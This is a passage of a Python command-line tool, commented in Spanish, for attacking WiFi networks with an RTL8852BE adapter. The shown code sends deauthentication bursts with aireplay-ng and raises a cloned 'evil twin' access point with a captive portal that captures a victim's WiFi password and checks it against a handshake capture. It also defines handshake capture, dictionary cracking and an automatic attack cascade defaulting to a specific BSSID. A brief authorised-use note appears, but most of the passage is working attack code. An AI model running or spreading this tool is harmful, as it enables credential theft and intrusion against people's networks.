                        "-o", internet, "-j", "ACCEPT"])
        _ejecutar_sudo(["iptables", "-A", "FORWARD", "-i", internet,
                        "-o", WLAN, "-m", "state", "--state",
                        "RELATED,ESTABLISHED", "-j", "ACCEPT"])
        _ejecutar_sudo(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        acciones.append(f"NAT hacia {internet}: ok")
    else:
        acciones.append("sin ruta por defecto: NAT omitido")
    return True, acciones, None


def _restaurar_ap():
    """Detiene hostapd/dnsmasq, limpia NAT y restaura WLAN a managed."""
    _ejecutar_sudo(["killall", "-9", "hostapd"])
    _ejecutar_sudo(["killall", "-9", "dnsmasq"])
    _ejecutar_sudo(["iptables", "-t", "nat", "-F", "PREROUTING"])
    _ejecutar_sudo(["iptables", "-t", "nat", "-F", "POSTROUTING"])
    _ejecutar_sudo(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    _ejecutar_sudo(["ip", "link", "set", WLAN, "down"])
    _ejecutar_sudo(["ip", "addr", "flush", "dev", WLAN])
    _ejecutar_sudo(["iw", "dev", WLAN, "set", "type", "managed"])
    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
    _ejecutar_sudo(["systemctl", "start", "NetworkManager"])
    time.sleep(2)


def _deauth_rapidas(bssid, canal, paquetes=5, segundos=8):
    """Intenta ráfagas de deauth (limitado en rtw89). No bloquea el flujo."""
    if not bssid:
        return {"intentado": False, "mensaje": "sin BSSID: deauth omitido"}
    prep = modo_monitor("on", advertencia_ok=True)
    if not prep.get("exito"):
        return {"intentado": False, "mensaje": "no se pudo entrar en monitor"}
    try:
        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
        time.sleep(2)
        c, _, e = _ejecutar_sudo(
            ["timeout", str(segundos), "aireplay-ng", "-0", str(paquetes),
             "-a", bssid, WLAN], timeout=segundos + 10)
        ok = c == 0 and "no" not in e.lower() or "acknowledge" in e.lower()
        return {
            "intentado": True,
            "paquetes": paquetes,
            "funciono": ok,
            "detalle": e[:100] or "se enviaron frames (sin confirmación)",
            "mensaje": (
                "deauth ejecutado" if ok
                else "deauth limitado en rtw89 (puede no haber surtido efecto)"
            ),
        }
    finally:
        _restaurar_red()


def clon(ssid, canal, captura=None, deauth=False, bssid=None,
         puerto=80, tiempo=180, diccionario=None):
    """Levanta una red clonada (mismo SSID) con portal cautivo.

    La víctima se conecta, escribe la clave y el portal la valida contra la
    captura .cap del AP real (si se proporciona). Deauth opcional previo.
    Reversión automática al terminar.
    """
    if not diccionario:
        dicts = diccionarios_disponibles()
        diccionario = dicts[0]["ruta"] if dicts else None
    resultado = {
        "exito": False,
        "ssid": ssid,
        "canal": canal,
        "acciones": [],
        "portal": None,
        "clave_capturada": None,
        "clave_valida": None,
        "intentos": 0,
        "nota": "Uso exclusivo en redes propias o con autorización.",
    }

    if deauth and bssid:
        resultado["deauth"] = _deauth_rapidas(bssid, canal)

    ok, acciones, error = _levantar_ap(ssid, canal)
    resultado["acciones"] += acciones
    if not ok:
        resultado["mensaje"] = f"no se pudo levantar el AP: {error}"
        _restaurar_ap()
        return resultado

    # Redirigir el HTTP (puerto 80) del AP hacia el puerto alto del portal,
    # para que el navegador de la víctima caiga en la página sin privilegios.
    _ejecutar_sudo(["iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", WLAN, "-p", "tcp", "--dport", "80",
                    "-j", "REDIRECT", "--to-port", str(puerto)])

    portal_datos = {
        "clave": None, "valida": None, "intentos": 0,
        "captura": captura, "diccionario": diccionario,
    }
    _PortalHTTP.resultado = portal_datos
    try:
        servidor = http.server.ThreadingHTTPServer(
            ("0.0.0.0", puerto), _PortalHTTP)
        import threading
        hilo = threading.Thread(target=servidor.serve_forever, daemon=True)
        hilo.start()
        resultado["portal"] = f"http://{AP_GATEWAY}:{puerto}"
        resultado["mensaje"] = (
            f"AP clonado '{ssid}' activo. Portal en {resultado['portal']}. "
            f"Esperando víctima (máx {tiempo}s)..."
        )
        # Mantener activo durante `tiempo` segundos, consultando el estado
        inicio = time.time()
        while time.time() - inicio < tiempo:
            if portal_datos["clave"] is not None:
                break
            time.sleep(1)
        servidor.shutdown()
        servidor.server_close()
        resultado["exito"] = True
        resultado["clave_capturada"] = portal_datos["clave"]
        resultado["clave_valida"] = portal_datos["valida"]
        resultado["intentos"] = portal_datos["intentos"]
        if portal_datos["clave"]:
            resultado["mensaje"] = (
                f"Clave capturada: '{portal_datos['clave']}' — "
                + ("VÁLIDA (correcta)"
                   if portal_datos["valida"]
                   else "no validada/incorrecta contra la captura")
            )
        else:
            resultado["mensaje"] = (
                "Tiempo agotado sin que la víctima introdujera la clave."
            )
    finally:
        _restaurar_ap()
    return resultado


def main():
    parser = argparse.ArgumentParser(
        description="Auditoría WiFi de este PC (RTL8852BE/rtw89). Salida JSON.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=ADVERTENCIA,
    )
    sub = parser.add_subparsers(dest="comando", required=True)

    p_status = sub.add_parser("status", help="estado del adaptador")
    p_status.set_defaults(func=lambda a: estado_adaptador())

    p_mon = sub.add_parser("monitor", help="activa/desactiva el modo monitor")
    p_mon.add_argument("on_off", choices=["on", "off"])
    p_mon.add_argument("--autorizado", action="store_true",
                       help="confirmar uso autorizado de la advertencia")
    p_mon.set_defaults(func=lambda a: modo_monitor(a.on_off, a.autorizado))

    p_scan = sub.add_parser("scan", help="escaneo de APs cercanos")
    p_scan.add_argument("--duracion", type=int, default=8, help="segundos de captura por pasada")
    p_scan.add_argument("--bandas", default="abg", choices=["bg", "a", "abg"])
    p_scan.set_defaults(func=lambda a: scan(a.duracion, a.bandas))

    p_cap = sub.add_parser("capture", help="captura de handshake a .cap")
    p_cap.add_argument("--bssid", required=True, help="BSSID del AP objetivo (AA:BB:..)")
    p_cap.add_argument("--canal", type=int, required=True)
    p_cap.add_argument("--duracion", type=int, default=60, help="segundos de captura")
    p_cap.add_argument("--salida", default=None)
    p_cap.set_defaults(func=lambda a: capture(a.bssid, a.canal, a.duracion, a.salida))

    p_crack = sub.add_parser("crack", help="crack offline por diccionario")
    p_crack.add_argument("--captura", required=True)
    p_crack.add_argument("--diccionario", default=None)
    p_crack.add_argument("--tiempo-max", type=int, default=120)
    p_crack.set_defaults(func=lambda a: crack(a.captura, a.diccionario, a.tiempo_max))

    p_words = sub.add_parser("words", help="lista diccionarios disponibles")
    p_words.set_defaults(func=lambda a: {"exito": True, "diccionarios": diccionarios_disponibles()})

    p_lab = sub.add_parser("lab", help="configura un AP de prueba legal")
    p_lab.add_argument("--ssid", default="AP_LAB_ESPAÑOL")
    p_lab.add_argument("--contrasena", default="laboratorio123")
    p_lab.add_argument("--canal", type=int, default=6)
    p_lab.set_defaults(func=lambda a: generar_lab(a.ssid, a.contrasena, a.canal))

    p_clon = sub.add_parser("clon", help="red clonada (evil twin) con portal cautivo")
    p_clon.add_argument("--ssid", required=True, help="SSID a clonar (mismo nombre)")
    p_clon.add_argument("--canal", type=int, default=6)
    p_clon.add_argument("--captura", default=None,
                        help=".cap del AP real para validar la clave capturada")
    p_clon.add_argument("--deauth", action="store_true",
                        help="intentar ráfagas de deauth previas (limitado en rtw89)")
    p_clon.add_argument("--bssid", default=None, help="BSSID objetivo para el deauth")
    p_clon.add_argument("--puerto", type=int, default=8080)
    p_clon.add_argument("--tiempo", type=int, default=180,
                        help="segundos que el AP espera a la víctima")
    p_clon.set_defaults(func=lambda a: clon(
        a.ssid, a.canal, a.captura, a.deauth, a.bssid,
        a.puerto, a.tiempo))

    p_auto = sub.add_parser("auto", help="cascada de ataques con fallback")
    p_auto.add_argument("--bssid", default="76:93:da:db:2b:fb")
    p_auto.add_argument("--canal", type=int, default=11)
    p_auto.add_argument("--duracion", type=int, default=60,
                        help="segundos de captura de handshake")
    p_auto.add_argument("--tiempo-dic", type=int, default=180,
                        help="timeout por diccionario en crack")
    p_auto.add_argument("--tiempo-mascara", type=int, default=120)
    p_auto.add_argument("--con-portal", action="store_true",
                        help="incluir el evil twin como último recurso")
    p_auto.set_defaults(func=lambda a: auto_ataque(
        a.bssid, a.canal, a.duracion, a.tiempo_dic, a.tiempo_mascara,
        a.con_portal))

    args = parser.parse_args()
    resultado = args.func(args)
    print(json.dumps(resultado, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()